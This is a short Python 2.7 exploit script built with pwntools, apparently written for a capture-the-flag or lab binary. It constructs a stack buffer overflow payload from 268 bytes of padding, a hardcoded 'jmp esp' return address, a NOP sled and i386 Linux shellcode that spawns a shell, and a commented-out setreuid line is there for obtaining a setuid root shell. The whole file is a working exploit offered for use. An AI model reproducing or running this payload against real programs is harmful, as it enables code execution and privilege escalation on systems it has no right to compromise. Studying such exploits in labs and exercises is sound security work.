#!/usr/bin/python2.7

from pwn import *

buf = ""
buf += "A" * 268
buf += p32(0xf7dd4ff7) # jmp esp
buf += "\x90" * 10
#for suid shell buf += asm(shellcraft.i386.linux.setreuid())
buf += asm(shellcraft.i386.sh())

print buf

